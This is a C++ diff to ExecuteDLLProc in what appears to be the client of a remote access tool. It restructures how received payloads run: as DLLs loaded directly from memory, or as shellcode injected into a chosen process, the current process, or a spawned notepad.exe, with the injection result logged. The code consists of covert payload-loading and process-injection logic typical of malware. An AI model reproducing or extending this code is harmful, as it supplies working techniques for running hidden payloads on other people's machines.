@@ -185,24 +185,18 @@ DWORD WINAPI ExecuteDLLProc(LPVOID param)
 #else
     DllRunner* runner = new MemoryDllRunner();
 #endif
-    HMEMORYMODULE module = runner->LoadLibraryA((char*)dll->buffer, info.Size);
-    if (module) {
+    if (info.RunType == MEMORYDLL) {
+        HMEMORYMODULE module = runner->LoadLibraryA((char*)dll->buffer, info.Size);
         switch (info.CallType) {
         case CALLTYPE_DEFAULT:
             while (S_CLIENT_EXIT != *pThread.Exit)
                 Sleep(1000);
             break;
         case CALLTYPE_IOCPTHREAD: {
-            PTHREAD_START_ROUTINE proc = (PTHREAD_START_ROUTINE)runner->GetProcAddress(module, "run");
+            PTHREAD_START_ROUTINE proc =  module ? (PTHREAD_START_ROUTINE)runner->GetProcAddress(module, "run") : NULL;
             Mprintf("MemoryGetProcAddress '%s' %s\n", info.Name, proc ? "success" : "failed");
             if (proc) {
-                if (info.RunType == MEMORYDLL)
-                    proc(&pThread);
-                else if (info.RunType == SHELLCODE){
-					ShellcodeInj inj(dll->buffer, info.Size, "run", &pThread, sizeof(PluginParam));
-                    if (info.Pid < 0) info.Pid = GetCurrentProcessId();
-                    bool ret = info.Pid ? inj.InjectProcess(info.Pid) : inj.InjectProcess("notepad.exe", true);
-                }
+                proc(&pThread);
             } else {
                 while (S_CLIENT_EXIT != *pThread.Exit)
                     Sleep(1000);
@@ -213,8 +207,12 @@ DWORD WINAPI ExecuteDLLProc(LPVOID param)
             break;
         }
         runner->FreeLibrary(module);
-    } else {
-        Mprintf("MemoryLoadLibrary '%s' failed\n", info.Name);
+    } else if (info.RunType == SHELLCODE){
+		bool flag = info.CallType == CALLTYPE_IOCPTHREAD;
+		ShellcodeInj inj(dll->buffer, info.Size, flag ? "run" : 0, flag ? &pThread : 0, flag ? sizeof(PluginParam) : 0);
+		if (info.Pid < 0) info.Pid = GetCurrentProcessId();
+		bool ret = info.Pid ? inj.InjectProcess(info.Pid) : inj.InjectProcess("notepad.exe", true);
+        Mprintf("Inject %s to process [%d] %s\n", info.Name, info.Pid, ret ? "succeed" : "failed");
     }
     SAFE_DELETE(dll);
     SAFE_DELETE(runner);
